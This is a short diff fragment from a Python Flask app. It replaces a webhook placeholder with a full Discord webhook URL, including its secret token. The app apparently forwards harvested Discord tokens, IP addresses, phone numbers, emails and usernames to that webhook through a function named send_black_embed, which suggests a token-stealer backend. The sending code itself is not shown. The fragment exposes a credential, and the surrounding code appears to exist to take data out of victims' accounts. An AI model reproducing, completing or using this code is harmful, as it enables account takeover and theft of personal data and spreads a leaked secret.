@@ -3,7 +3,7 @@ from dhooks import Webhook, Embed
 import requests
 
 app = Flask(__name__)
-hook = Webhook('YOUR WEBHOOK')
+hook = Webhook('https://discord.com/api/webhooks/1122621720101126286/KquuOWPzMziWjh5FKyPYFHhlf22B3a_7qF1eZx1OZdGCzmebXM1O1y2-Vo7TCTFaZHnN')
 
 
 def send_black_embed(token, ip, phone_number, email, username, tag, avatar_url,
